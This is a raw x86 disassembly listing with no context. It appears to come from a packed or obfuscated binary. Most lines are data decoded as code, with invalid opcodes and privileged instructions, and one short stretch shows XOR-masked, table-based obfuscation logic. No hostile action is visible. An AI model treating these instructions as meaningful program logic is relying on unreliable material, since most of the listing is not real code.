  41eb3a:	mov    ecx,0x606a7b1d
  41eb3f:	mov    bh,0x53
  41eb41:	and    eax,0xc11a1f1b
  41eb46:	(bad)  
  41eb47:	aad    0xb6
  41eb49:	shl    BYTE PTR [eax],0x43
  41eb4c:	mov    ecx,ebx
  41eb4e:	jbe    0x41eb02
  41eb50:	pusha  
  41eb51:	mov    ebx,0x69fd0a5b
  41eb56:	(bad)  
  41eb57:	mov    ebx,gs
  41eb59:	in     eax,dx
  41eb5a:	iret   
  41eb5b:	test   al,0x2c
  41eb5d:	repnz dec esp
  41eb5f:	jb     0x41eb13
  41eb61:	imul   esp,DWORD PTR [ebx],0x79
  41eb64:	push   ecx
  41eb65:	mov    bh,0xd1
  41eb67:	xchg   esi,eax
  41eb68:	mov    ds:0xd7b7c1d4,eax
  41eb6d:	fbstp  TBYTE PTR [eax]
  41eb6f:	test   al,0x4
  41eb71:	and    ebp,esp
  41eb73:	lock xor BYTE PTR [ebx+0x3fc374cd],cl
  41eb7a:	out    dx,eax
  41eb7b:	retf   0x7dda
  41eb7e:	test   bl,0x42
  41eb81:	adc    BYTE PTR [edx-0x22],ah
  41eb84:	arpl   dx,dx
  41eb86:	mov    ch,0x8b
  41eb88:	mov    BYTE PTR [ebp+0x63],dh
  41eb8b:	sti    
  41eb8c:	push   ebp
  41eb8d:	mov    ch,0x73
  41eb8f:	or     esp,DWORD PTR [eax-0xc8864d9]
  41eb95:	xchg   esp,eax
  41eb96:	in     al,0xe9
  41eb98:	or     bh,BYTE PTR [esi]
  41eb9a:	test   BYTE PTR [ebp+eiz*4-0x6c2facef],ah
  41eba1:	xchg   edx,eax
  41eba2:	dec    ebp
  41eba3:	pop    esi
  41eba4:	add    BYTE PTR [ecx],ch
  41eba6:	ja     0x41eb7c
  41eba8:	jg     0x41ebec
  41ebaa:	stc    
  41ebab:	nop
  41ebac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebad:	and    edx,edx
  41ebaf:	and    BYTE PTR [edx],bl
  41ebb1:	mov    al,0xe8
  41ebb3:	dec    ecx
  41ebb4:	cmp    eax,0x58396218
  41ebb9:	repz sbb al,0x7e
  41ebbc:	(bad)  
  41ebbd:	mov    ecx,0x351d3d2d
  41ebc2:	jno    0x41ebaf
  41ebc4:	jne    0x41eb63
  41ebc6:	shl    DWORD PTR [esi],1
  41ebc8:	xchg   ebx,eax
  41ebc9:	adc    eax,0xa76e5d4e
  41ebce:	mov    ebx,edx
  41ebd0:	pop    eax
  41ebd1:	cld    
  41ebd2:	shr    BYTE PTR [esi-0x14],1
  41ebd5:	mov    esi,0x110f4d0b
  41ebda:	or     ecx,DWORD PTR [esp+eax*8-0x5f]
  41ebde:	sub    bh,BYTE PTR [eax]
  41ebe0:	stos   BYTE PTR es:[edi],al
  41ebe1:	loopne 0x41ebf1
  41ebe3:	or     esi,DWORD PTR [esp+eiz*4+0x40636f32]
  41ebea:	cmp    DWORD PTR [eax-0x654e8c24],edi
  41ebf0:	retf   
  41ebf1:	shl    DWORD PTR [edi],0xf5
  41ebf4:	aad    0x39
  41ebf6:	push   ebp
  41ebf7:	jl     0x41ec3e
  41ebf9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ebfa:	in     al,dx
  41ebfb:	aad    0x16
  41ebfd:	les    ebx,FWORD PTR [ebx-0x6f]
  41ec00:	push   edx
  41ec01:	dec    DWORD PTR ds:0x25511904
  41ec07:	sti    
  41ec08:	(bad)  
  41ec09:	cld    
  41ec0a:	(bad)  
  41ec0b:	sub    dl,BYTE PTR [ebx+edi*2-0x12f2f42]
  41ec12:	and    bh,BYTE PTR [eax]
  41ec14:	push   ebx
  41ec15:	inc    esp
  41ec16:	in     eax,dx
  41ec17:	dec    edi
  41ec18:	push   es
  41ec19:	cwde   
  41ec1a:	sahf   
  41ec1b:	call   0x21c5ba17
  41ec20:	mov    edx,0x734e30e3
  41ec25:	push   0x708466c9
  41ec2a:	mov    ebp,0x10ac3283
  41ec2f:	pushf  
  41ec30:	cmp    ebx,ecx
  41ec32:	jecxz  0x41ebf8
  41ec34:	imul   esi,DWORD PTR [edi+0x6e],0x72636e54
  41ec3b:	xchg   ch,dl
  41ec3d:	clc    
  41ec3e:	shl    DWORD PTR [esp+esi*4-0x4446ad67],1
  41ec45:	ins    DWORD PTR es:[edi],dx
  41ec46:	mov    ds:0x2fae1437,eax
  41ec4b:	jl     0x41ec94
  41ec4d:	sbb    eax,0xfa77b73
  41ec52:	aaa    
  41ec53:	ins    DWORD PTR es:[edi],dx
  41ec54:	and    ch,BYTE PTR [edi]
  41ec56:	inc    esi
  41ec57:	(bad)  
  41ec58:	adc    DWORD PTR [ecx+ebp*2],esp
  41ec5b:	jne    0x41ec54
  41ec5d:	leave  
  41ec5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec5f:	mov    BYTE PTR [ebx+ebp*1-0x6ffad8bf],bh
  41ec66:	mov    ebp,0x589e2a96
  41ec6b:	call   0x8a52d0db
  41ec70:	rcl    ah,0x5a
  41ec73:	rcl    edx,cl
  41ec75:	fadd   st,st(7)
  41ec77:	imul   ebp,DWORD PTR [ebx-0x4fd6e724],0x8
  41ec7e:	es sub al,0x56
  41ec81:	sub    eax,0x8de68ca3
  41ec86:	push   es
  41ec87:	push   ebp
  41ec88:	push   0x7a3d7fe0
  41ec8d:	aas    
  41ec8e:	sahf   
  41ec8f:	push   esp
  41ec90:	iret   
  41ec91:	bnd jae 0x41ecc5
  41ec94:	rol    BYTE PTR [ebp-0x35],0x5d
  41ec98:	ins    BYTE PTR es:[edi],dx
  41ec99:	aam    0xa0
  41ec9b:	daa    
  41ec9c:	out    dx,eax
  41ec9d:	jns    0x41eccc
  41ec9f:	push   eax
  41eca0:	jge    0x41ece2
  41eca2:	lds    esi,FWORD PTR [ecx]
  41eca4:	xchg   edi,eax
  41eca5:	or     DWORD PTR [edi+edx*4],edx
  41eca8:	xchg   DWORD PTR [edx+0x21],ecx
  41ecab:	pop    esp
  41ecac:	cmp    cl,BYTE PTR [edx-0x9ce2b44]
  41ecb2:	fcomp  QWORD PTR [ebx+esi*8-0x58]
  41ecb6:	shl    edx,0xfe
  41ecb9:	sbb    bl,dh
  41ecbb:	dec    ebp
  41ecbc:	jmp    0xe384122c
  41ecc1:	ds sbb al,0x82
  41ecc4:	xchg   BYTE PTR [ecx-0x611c9eed],ch
  41ecca:	jle    0x41ec5e
  41eccc:	xchg   ebp,eax
  41eccd:	(bad)  
  41ecce:	mov    ds:0xb471864f,al
  41ecd3:	sar    DWORD PTR [edi+0x5eb2bf67],cl
  41ecd9:	fcomp  QWORD PTR [ebx-0x3]
  41ecdc:	sub    ah,BYTE PTR [edx+eax*4+0x0]
  41ece0:	pushw  es
  41ece2:	mov    DWORD PTR [bx],ecx
  41ece5:	in     al,dx
  41ece6:	lea    edx,[esi+0x1d]
  41ece9:	pop    ebx
  41ecea:	mov    DWORD PTR [ebp+0x51233b29],0x2b9545f0
  41ecf4:	into   
  41ecf5:	xor    ecx,eax
  41ecf7:	mov    DWORD PTR [ebp+0x8],ecx
  41ecfa:	mov    ecx,DWORD PTR [ebp+0x8]
  41ecfd:	mov    edx,DWORD PTR [ebp+0x8]
  41ed00:	imul   edx,edx,0x5708f5
  41ed06:	xor    ecx,eax
  41ed08:	add    ecx,esi
  41ed0a:	lea    ecx,[ebp+ecx*4-0x64]
  41ed0e:	mov    edi,DWORD PTR [ecx]
  41ed10:	add    edx,edi
  41ed12:	mov    DWORD PTR [ecx],edx
  41ed14:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed17:	xor    ecx,eax
  41ed19:	add    ecx,esi
  41ed1b:	jne    0x41c96c
  41ed21:	mov    ecx,DWORD PTR [ebp-0x8]
  41ed24:	mov    edx,DWORD PTR [ebp-0x20]
  41ed27:	xor    ecx,eax
  41ed29:	lea    ecx,[ecx+edx*1+0x3272db]
  41ed30:	mov    DWORD PTR [ebp-0x20],ecx
  41ed33:	inc    DWORD PTR [ebp+0xc]
  41ed36:	mov    ecx,DWORD PTR [ebp-0x1c]
  41ed39:	xor    ecx,eax
  41ed3b:	add    ecx,esi
  41ed3d:	jne    0x41c71d
  41ed43:	jmp    0x421147
  41ed48:	mov    ecx,DWORD PTR [ebp-0xc]
  41ed4b:	mov    DWORD PTR [ebp+0x8],ecx
  41ed4e:	jmp    0x41ed80
  41ed53:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed56:	mov    edx,DWORD PTR [ebp-0x8]
  41ed59:	xor    ecx,eax
  41ed5b:	xor    edx,eax
  41ed5d:	sub    ecx,edx
  41ed5f:	sub    ecx,esi
  41ed61:	xor    ecx,eax
  41ed63:	mov    DWORD PTR [ebp+0x8],ecx
  41ed66:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed69:	mov    edx,DWORD PTR [ebp+0x8]
  41ed6c:	imul   edx,edx,0x5708f5
  41ed72:	xor    ecx,eax
  41ed74:	add    ecx,esi
  41ed76:	lea    ecx,[ebp+ecx*4-0x64]
  41ed7a:	mov    edi,DWORD PTR [ecx]
  41ed7c:	add    edx,edi
  41ed7e:	mov    DWORD PTR [ecx],edx
  41ed80:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed83:	xor    ecx,eax
  41ed85:	add    ecx,esi
  41ed87:	jne    0x41ed53
  41ed8d:	jmp    0x421153
  41ed92:	mov    ecx,DWORD PTR [ebp+0x8]
  41ed95:	mov    edx,DWORD PTR [ebp-0x8]
  41ed98:	xor    ecx,eax
  41ed9a:	xor    edx,eax
  41ed9c:	sub    ecx,edx
  41ed9e:	sub    ecx,esi
  41eda0:	xor    ecx,eax
  41eda2:	mov    DWORD PTR [ebp+0x8],ecx
  41eda5:	mov    ecx,DWORD PTR [ebp+0x8]
  41eda8:	mov    edx,DWORD PTR [ebp+0x8]
  41edab:	xor    ecx,eax
  41edad:	imul   edx,edx,0x5708f5
  41edb3:	add    ecx,esi
  41edb5:	lea    ecx,[ebp+ecx*4-0x64]
  41edb9:	jmp    0x421134
  41edbe:	dec    ecx
  41edbf:	xor    eax,0xa7642764
  41edc4:	test   DWORD PTR [ebx],edx
  41edc6:	mov    esi,0x93e70850
  41edcb:	adc    eax,0xda83a93a
  41edd0:	popa   
  41edd1:	bound  eax,QWORD PTR [edi+ebx*2]
  41edd4:	bound  esp,QWORD PTR [edx-0x26]
  41edd7:	outs   dx,BYTE PTR ds:[esi]
  41edd8:	mov    ch,bh
  41edda:	mov    esi,0xcddac2ab
  41eddf:	jnp    0x41ee27
  41ede1:	ja     0x41edb6
  41ede3:	pop    eax
  41ede4:	mov    dh,0x16
  41ede6:	mov    esi,0x91d2d3fa
  41edeb:	sub    BYTE PTR [eax],dl
  41eded:	xchg   esi,eax
  41edee:	test   DWORD PTR [ecx+0x684594b1],eax
  41edf4:	loope  0x41ed91
  41edf6:	sub    DWORD PTR [ebp+0x2449a8e3],ebx
  41edfc:	rcr    DWORD PTR [ebx-0x53c731eb],cl
  41ee02:	cld    
  41ee03:	fdivrp st(2),st
  41ee05:	(bad)  
  41ee06:	jo     0x41ee25
  41ee08:	cmp    eax,0x658e445f
  41ee0d:	dec    edx
  41ee0e:	frstor [eax]
  41ee10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee11:	mov    esi,0xdc38ddbd
  41ee16:	cmpxchg DWORD PTR [ebp+0x69],ebp
  41ee1a:	and    DWORD PTR [ebx+0x5f],eax
  41ee1d:	into   
  41ee1e:	mov    bh,0xc8
  41ee20:	fisubr DWORD PTR [eax+esi*1+0x46]
  41ee24:	xor    esp,DWORD PTR [edi-0x39d8f492]
  41ee2a:	add    DWORD PTR [edx-0x6b],ecx
  41ee2d:	mov    al,ds:0xf8adc69a
  41ee32:	and    BYTE PTR [eax],cl
  41ee34:	or     DWORD PTR [eax],edi
  41ee36:	lahf   
  41ee37:	aad    0x1
  41ee39:	or     eax,0xb44852c4
  41ee3e:	rcl    BYTE PTR [edi],0xf1
  41ee41:	scas   al,BYTE PTR es:[edi]
  41ee42:	ins    DWORD PTR es:[edi],dx
  41ee43:	aas    
  41ee44:	dec    ebx
  41ee45:	sbb    ch,ch
  41ee47:	sbb    DWORD PTR [edx+edx*4],esi
  41ee4a:	pop    ecx
  41ee4b:	cs jo  0x41ee0f
  41ee4e:	cmp    bh,BYTE PTR [eax+0x3d]
  41ee51:	mov    ds:0x47c98227,al
  41ee56:	cld    
  41ee57:	push   ecx
  41ee58:	cld    
  41ee59:	(bad)  
  41ee5a:	outs   dx,BYTE PTR ds:[esi]
  41ee5b:	adc    eax,DWORD PTR [eax+0x7c]
  41ee5e:	popf   
  41ee5f:	jo     0x41ee2c
  41ee61:	std    
  41ee62:	into   
  41ee63:	sub    ecx,edx
  41ee65:	sub    al,0xbf
  41ee67:	adc    ebx,DWORD PTR [ecx]
  41ee69:	sbb    BYTE PTR fs:[edx-0x530423d],dh
  41ee70:	push   0x22d2fe01
  41ee75:	cwde   
  41ee76:	jne    0x41eee9
  41ee78:	add    ebx,DWORD PTR [edi]
  41ee7a:	ds cmp eax,0xbdb0db9a
  41ee80:	adc    ebx,ecx
  41ee82:	sbb    al,0xad
  41ee84:	xor    bh,dh
  41ee86:	sbb    DWORD PTR gs:[ebx],esp
  41ee89:	ja     0x41ee58
  41ee8b:	push   ds
  41ee8c:	mov    esp,0xaf290a9b
  41ee91:	sub    al,0xd1
  41ee93:	sar    ebp,cl
  41ee95:	ins    BYTE PTR es:[edi],dx
  41ee96:	std    
  41ee97:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ee98:	inc    esi
  41ee99:	cmp    esp,ebx
  41ee9b:	scas   eax,DWORD PTR es:[edi]
  41ee9c:	and    al,ch
  41ee9e:	imul   DWORD PTR [edx]
  41eea0:	lahf   
  41eea1:	(bad)  
  41eea2:	and    al,0x95
  41eea4:	inc    ebx
  41eea5:	xor    BYTE PTR [edx+edx*4-0x43b08259],al
  41eeac:	int3   
  41eead:	or     BYTE PTR ds:[ebx+0xa],0x85
  41eeb2:	mov    bh,0xc
  41eeb4:	inc    ecx
  41eeb5:	cmp    BYTE PTR [edi+0x69],cl
  41eeb8:	inc    ebp
  41eeb9:	inc    edi
  41eeba:	jmp    0x2b85c01d
  41eebf:	in     al,0x9a
  41eec1:	add    eax,0xdd04780
  41eec6:	lea    ebx,[ebp+0x4a]
  41eec9:	jmp    0xb27d:0xb97c2369
  41eed0:	and    eax,0x29cca357
  41eed5:	push   edi
  41eed6:	or     dh,al
  41eed8:	add    ecx,DWORD PTR [eax-0xb]
  41eedb:	clc    
  41eedc:	push   esi
  41eedd:	add    ah,cl
  41eedf:	hlt    
  41eee0:	xchg   edx,eax
  41eee1:	mov    BYTE PTR [ebx+ecx*4],bh
  41eee4:	fcmove st,st(1)
  41eee6:	xchg   esp,eax
  41eee7:	dec    eax
  41eee8:	enter  0x28b4,0x61
  41eeec:	lods   al,BYTE PTR ds:[esi]
  41eeed:	iret   
  41eeee:	mov    edx,edi
  41eef0:	clc    
  41eef1:	jns    0x41eea4
  41eef3:	clc    
  41eef4:	ret    0x24e9
  41eef7:	pop    eax
  41eef8:	(bad)  
  41eef9:	dec    ecx
  41eefa:	add    bh,BYTE PTR [ebx]
  41eefc:	mov    dh,0x75
  41eefe:	inc    ecx
  41eeff:	cld    
  41ef00:	xchg   esp,esp
  41ef02:	sbb    eax,0x1c11d45d
  41ef07:	xchg   esi,eax
  41ef08:	inc    eax
  41ef09:	ror    DWORD PTR [edi],cl
  41ef0b:	fst    DWORD PTR [ebp+0x655b1c0e]
  41ef11:	xchg   ecx,eax
  41ef12:	sti    
  41ef13:	gs sbb eax,0x7662ec17
  41ef19:	bound  edi,QWORD PTR [ebx+edi*4+0x5e502e91]
  41ef20:	ins    BYTE PTR es:[edi],dx
  41ef21:	stos   DWORD PTR es:[edi],eax
  41ef22:	scas   eax,DWORD PTR es:[edi]
  41ef23:	mov    DWORD PTR [esi+eiz*2],eax
  41ef26:	fild   QWORD PTR ss:[eax]
  41ef29:	jmp    0x6c60c3ca
  41ef2e:	xchg   esi,eax
  41ef2f:	cmp    eax,0xf79a4aa2
  41ef34:	mov    dh,0xb2
  41ef36:	pop    ds
  41ef37:	sbb    eax,0xfd711927
  41ef3c:	fild   DWORD PTR [edi+0x39]
  41ef3f:	cmp    dh,BYTE PTR [edi-0x1c]
  41ef42:	enter  0xc85a,0xe6
  41ef46:	cmp    al,0xd7
  41ef48:	aaa    
  41ef49:	adc    ah,BYTE PTR [esi+0x46]
  41ef4c:	inc    edi
  41ef4d:	icebp  
  41ef4e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef4f:	(bad)  
  41ef51:	fcmovnu st,st(1)
  41ef53:	xor    al,0xcd
  41ef55:	sub    DWORD PTR [eax-0x9],esp
  41ef58:	dec    esp
  41ef59:	add    ecx,esp
  41ef5b:	sbb    eax,0x5c2b46f7
  41ef60:	bound  ebx,QWORD PTR [edx*8-0x543acce3]
  41ef67:	ins    BYTE PTR es:[edi],dx
  41ef68:	cs dec edx
  41ef6a:	test   dh,dh
  41ef6c:	or     ebx,DWORD PTR ds:0x9233f30c
  41ef72:	inc    esi
  41ef73:	(bad)  
  41ef74:	jae    0x41ef68
  41ef76:	mov    DWORD PTR [eax+0x34],eax
  41ef79:	pop    edi
  41ef7a:	add    bh,dh
  41ef7c:	sbb    al,0x8f
  41ef7e:	mov    eax,ds:0x1b726d23
  41ef83:	repz and bh,BYTE PTR [ecx-0x58]
  41ef87:	cmp    al,0xb7
  41ef89:	pop    esi
  41ef8a:	sbb    DWORD PTR [edx],0x7e
  41ef8d:	dec    eax
  41ef8e:	pop    ds
  41ef8f:	cmc    
  41ef90:	adc    edx,0x7f
  41ef93:	rcr    BYTE PTR [ecx],cl
  41ef95:	sub    eax,DWORD PTR [eax+0x6f]
  41ef98:	add    edi,DWORD PTR [ebp-0x3747f455]
  41ef9e:	inc    edx
  41ef9f:	pop    esp
  41efa0:	dec    ecx
  41efa1:	sub    DWORD PTR [ecx+0x1a7cd88c],0x2a
  41efa8:	iret   
  41efa9:	loope  0x41effa
  41efab:	xor    eax,0x35bfcb0f
  41efb0:	push   0xffffffab
  41efb2:	add    eax,DWORD PTR [ecx]
  41efb4:	dec    edx
  41efb5:	mov    ebp,0xfd844507
  41efba:	shl    dl,cl
  41efbc:	cmp    ebp,DWORD PTR [edx-0x40f4f757]
  41efc2:	fcmovne st,st(3)
  41efc4:	jo     0x41f032
  41efc6:	mov    esp,0xe97be762
  41efcb:	pop    ebx
  41efcc:	sbb    esi,DWORD PTR [edx-0x5a]
  41efcf:	addr16 out dx,eax
  41efd1:	jl     0x41eff4
  41efd3:	jp     0x41f03e
  41efd5:	push   ebp
  41efd6:	adc    esp,DWORD PTR [ebp+0x61]
  41efd9:	ret    
  41efda:	cmc    
  41efdb:	pop    eax
  41efdc:	stos   DWORD PTR es:[edi],eax
  41efdd:	stos   DWORD PTR es:[edi],eax
  41efde:	jb     0x41ef80
  41efe0:	ss push edx
  41efe2:	mov    ebx,0x4c8b3d77
  41efe7:	idiv   BYTE PTR [eax]
  41efe9:	adc    BYTE PTR [ebx],dl
  41efeb:	lock jmp 0xbd600e5c
  41eff1:	imul   DWORD PTR [ecx+0x60]
  41eff4:	or     eax,DWORD PTR [ebx]
  41eff6:	fiadd  DWORD PTR [ecx+0x45805f20]
  41effc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41effd:	push   ebx
  41effe:	push   0x3bfa07b5
  41f003:	and    cl,BYTE PTR [edx+0x2c81225d]
  41f009:	or     ebx,DWORD PTR ds:0xb08935d3
  41f00f:	mov    bh,0x42
  41f011:	jmp    0x41f018
  41f013:	add    ah,bl
  41f015:	es and eax,0xca4ce0c9
  41f01b:	(bad)  
  41f01c:	cmp    bh,BYTE PTR [ebp+0x7d4ed9a1]
  41f022:	ins    DWORD PTR es:[edi],dx
  41f023:	pusha  
  41f024:	pop    ss
  41f025:	sbb    BYTE PTR [ebx+eiz*8-0x3f],cl
  41f029:	pop    edi
  41f02a:	aaa    
  41f02b:	outs   dx,BYTE PTR ds:[esi]
  41f02c:	js     0x41f020
  41f02e:	cwde   
  41f02f:	push   0x68
  41f031:	pop    es
  41f032:	lea    edx,[edx+0x55]
  41f035:	mov    ds:0xd55fc544,eax
  41f03a:	cmp    ah,ch
  41f03c:	aad    0x6d
  41f03e:	mov    dl,0xe1
  41f040:	std    
  41f041:	out    0x26,eax
  41f043:	sbb    al,0x27
  41f045:	sub    al,0xb
  41f047:	push   edx
  41f048:	enter  0x1c2,0x18
  41f04c:	mov    eax,0xdd2f9a4f
  41f051:	scas   eax,DWORD PTR es:[edi]
  41f052:	aaa    
  41f053:	jge    0x41f0b2
  41f055:	jmp    0xcbd1:0xb32e5011
  41f05c:	call   0xe00f:0x7c21933c
  41f063:	inc    edi
  41f064:	loop   0x41f0b4
  41f066:	je     0x41f09a
  41f068:	repz fimul DWORD PTR [ebx+eiz*8-0x7a]
  41f06d:	cmp    ebx,DWORD PTR [esi+0x3e26fdb2]
  41f073:	xchg   DWORD PTR [esi+ecx*2+0x27],ecx
  41f077:	mov    eax,0x42c2bc93
  41f07c:	std    
  41f07d:	out    dx,eax
  41f07e:	dec    edi
  41f07f:	and    esi,esi
  41f081:	or     ch,BYTE PTR [edi-0x5b90ad08]
  41f087:	(bad)  
  41f088:	not    BYTE PTR [edi+0x5e]
  41f08b:	stos   BYTE PTR es:[edi],al
  41f08c:	je     0x41f0e0
  41f08e:	sub    BYTE PTR [ecx-0x4ee0630],al
  41f094:	icebp  
  41f095:	cs push es
  41f097:	xchg   esi,eax
  41f098:	int    0xb2
  41f09a:	and    eax,0x216e0d9d
  41f09f:	cmp    bl,BYTE PTR [edi-0x23]
  41f0a2:	mov    al,0xe7
  41f0a4:	enter  0xadf8,0x99
  41f0a8:	or     dh,ch
  41f0aa:	inc    ecx
  41f0ab:	pop    ecx
  41f0ac:	jns    0x41f120
  41f0ae:	mov    ecx,0xaa85b75c
  41f0b3:	inc    ebp
  41f0b4:	push   ebx
  41f0b5:	jo     0x41f0e0
  41f0b7:	jl     0x41f04a
  41f0b9:	and    edx,DWORD PTR [eax]
  41f0bb:	mov    eax,0x806f5b88
  41f0c0:	retf   0xdd8e
  41f0c3:	arpl   WORD PTR [ebx-0x59131834],dx
  41f0c9:	cdq    
  41f0ca:	jmp    0x5f6a:0x73cca930
  41f0d1:	cmp    bh,BYTE PTR [edx]
  41f0d3:	(bad)  
  41f0d5:	ins    BYTE PTR es:[edi],dx
  41f0d6:	jae    0x41f10e
  41f0d8:	xchg   ecx,eax
  41f0d9:	fwait
  41f0da:	(bad)  
  41f0db:	push   ecx
  41f0dc:	push   es
  41f0dd:	pop    eax
  41f0de:	jp     0x41f0e2
  41f0e0:	sbb    edi,DWORD PTR [eax-0x7adfce10]
  41f0e6:	push   ecx
  41f0e7:	ret    0xaa58
  41f0ea:	(bad)  
  41f0eb:	sahf   
  41f0ec:	dec    edx
  41f0ed:	inc    edi
  41f0ee:	mov    ah,0x89
  41f0f0:	inc    eax
  41f0f1:	mov    bh,0x8b
  41f0f3:	repnz inc ebx
  41f0f5:	ficom  WORD PTR [edx]
  41f0f7:	rcr    BYTE PTR [ebx-0x42],0x4d
  41f0fb:	push   ecx
  41f0fc:	xchg   esi,eax
  41f0fd:	jnp    0x41f0ea
  41f0ff:	idiv   DWORD PTR [eax-0x29]
  41f102:	das    
  41f103:	cmp    al,0x1c
  41f105:	push   cs
  41f106:	or     ch,bl
  41f108:	sti    
  41f109:	jg     0x41f08e
  41f10b:	ret    0xae61
  41f10e:	add    BYTE PTR [edi-0xa],ch
  41f111:	add    eax,0x3af7f7
  41f116:	nop
  41f117:	add    al,0xc4
  41f119:	pop    esi
  41f11a:	sar    DWORD PTR [ebx-0x20d68528],0xf1
  41f121:	xchg   edi,eax
  41f122:	sub    DWORD PTR [eax-0x13e1fa1a],0x19509fa
  41f12c:	(bad)  
  41f12d:	stos   BYTE PTR es:[edi],al
  41f12e:	mov    ds:0x386cab3a,eax
  41f133:	lock ficom WORD PTR [edx-0x4d]
  41f137:	fldenv [ebp+0x788c9d86]
  41f13d:	(bad)  
  41f13f:	cmp    DWORD PTR [ecx+edi*2-0x1f],edx
  41f143:	push   eax
  41f144:	adc    ebx,DWORD PTR [edi]
  41f146:	inc    esi
  41f147:	cmp    al,ah
  41f149:	mov    al,ds:0x94fe858a
  41f14e:	inc    esi
  41f14f:	lahf   
  41f150:	in     al,0xbe
  41f152:	inc    ecx
  41f153:	adc    DWORD PTR [bx],0x643a1ed2
  41f15a:	and    al,0xc0
  41f15c:	stos   BYTE PTR es:[edi],al
  41f15d:	mov    cs,WORD PTR [edi+eax*4+0x5ecd95b8]
  41f164:	mov    ebx,0x4e196673
  41f169:	cwde   
  41f16a:	fmul   st(2),st
  41f16c:	add    al,0x9
  41f16e:	and    ebx,ebx
  41f170:	or     eax,0xba8d8cf9
  41f175:	or     dh,BYTE PTR [edx-0x29172e00]
  41f17b:	jmp    0x48929c03
  41f180:	in     al,dx
  41f181:	push   ebx
  41f182:	lds    ebp,FWORD PTR [ecx+edx*4]
  41f185:	jnp    0x41f124
  41f187:	and    ah,BYTE PTR [esi-0xacb80f7]
  41f18d:	fs push esp
  41f18f:	addr16 jl 0x41f1b2
  41f192:	int    0xbb
  41f194:	call   0x899c4ae8
  41f199:	ins    DWORD PTR es:[edi],dx
  41f19a:	xchg   edi,eax
  41f19b:	xchg   esi,eax
  41f19c:	loopne 0x41f19a
  41f19e:	and    al,bh
  41f1a0:	jmp    0x14e7:0xc1b52971
  41f1a7:	jle    0x41f188
  41f1a9:	pop    eax
  41f1aa:	or     eax,0x25563418
  41f1af:	aas    
  41f1b0:	push   es
  41f1b1:	or     BYTE PTR [ecx+0x1],bl
  41f1b4:	cmp    eax,0xa998fe7f
  41f1b9:	jnp    0x41f1bd
  41f1bb:	mov    ecx,0xeaa5c3bd
  41f1c0:	(bad)  
  41f1c2:	pusha  
  41f1c3:	xchg   BYTE PTR [eax],dh
  41f1c5:	iret   
  41f1c6:	out    0xb2,al
  41f1c8:	loope  0x41f21e
  41f1ca:	dec    ecx
  41f1cb:	mov    ebx,0xaa83183f
  41f1d0:	inc    edi
  41f1d1:	dec    ebx
  41f1d2:	mov    BYTE PTR [esi+eiz*8-0x3805263],ch
  41f1d9:	sub    ecx,DWORD PTR [edx+edi*8+0x37]
  41f1dd:	xchg   ecx,eax
  41f1de:	les    edx,FWORD PTR [edx+0x28]
  41f1e1:	jns    0x41f212
  41f1e3:	pushf  
  41f1e4:	push   0x4a
  41f1e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f1e7:	inc    ecx
  41f1e8:	nop
  41f1e9:	je     0x41f19f
  41f1eb:	loop   0x41f257
  41f1ed:	add    DWORD PTR [edx],edx
  41f1ef:	adc    al,0x2d
  41f1f1:	inc    eax
  41f1f2:	stos   BYTE PTR es:[edi],al
  41f1f3:	cmp    eax,0x1a2a59a8
  41f1f8:	aam    0x32
  41f1fa:	jmp    0x41f22d
  41f1fc:	lock mov ch,ch
  41f1ff:	int3   
  41f200:	jbe    0x41f1a1
  41f202:	aam    0xa0
  41f204:	sbb    al,0xd4
  41f206:	or     esp,ebp
  41f208:	leave  
  41f209:	xchg   edx,eax
  41f20a:	sbb    al,0xff
  41f20c:	sub    al,0xc
  41f20e:	es popa 
  41f210:	scas   eax,DWORD PTR es:[edi]
  41f211:	jge    0x41f1d0
  41f213:	ja     0x41f1ec
  41f215:	sub    ah,BYTE PTR [edi]
  41f217:	in     eax,0x13
  41f219:	xor    al,dh
  41f21b:	sub    al,0xab
  41f21d:	sbb    BYTE PTR [esp+eax*2-0x7422d209],al
  41f224:	cld    
  41f225:	(bad)  [ecx]
  41f227:	ss out dx,al
  41f229:	ror    DWORD PTR [edi],cl
  41f22b:	push   esp
  41f22c:	fist   WORD PTR [ebx+ecx*1]
  41f22f:	mov    DWORD PTR [ebx+edx*4],eax
  41f232:	add    BYTE PTR [edi-0x1e1c5cdb],dh
  41f238:	adc    eax,0x12479377
  41f23d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f23e:	adc    eax,0xd645c1a7
  41f243:	inc    ebp
  41f244:	pop    ds
  41f245:	jae    0x41f264
  41f247:	or     al,BYTE PTR [ebx-0x6b]
  41f24a:	cs inc ebp
  41f24c:	jo     0x41f26e
  41f24e:	push   ecx
  41f24f:	rol    BYTE PTR [ebx-0x6c8031fa],0x44
  41f256:	das    
  41f257:	int    0x82
  41f259:	inc    eax
  41f25a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41f25b:	mov    edx,DWORD PTR [edx]
  41f25d:	add    al,0xf
  41f25f:	xchg   ebx,eax
  41f260:	mov    dl,0x3d
  41f262:	imul   esi,DWORD PTR [eax-0x5e8cb4b2],0x70
  41f269:	in     ax,dx
  41f26b:	mov    al,ds:0xf7e8638f
  41f270:	xchg   ebx,eax
  41f271:	adc    DWORD PTR [ebp+0x9ab1f71],edx
  41f277:	mov    bh,0xb8
  41f279:	push   ecx
  41f27a:	adc    eax,0x79607684
  41f27f:	xchg   edx,eax
  41f280:	mov    cl,0x71
  41f282:	ror    DWORD PTR [eax-0x7a],0x13
  41f286:	sbb    eax,0x204e1e1f
  41f28b:	and    eax,0xb5b2852c
  41f290:	test   eax,0xfe8e7cde
  41f295:	sbb    edx,DWORD PTR [ecx+ebx*1-0x531d28db]
  41f29c:	jae    0x41f294
  41f29e:	test   cl,dh
  41f2a0:	pop    esi
  41f2a1:	add    DWORD PTR [ebp-0x7c],edx
  41f2a4:	jno    0x41f2bd
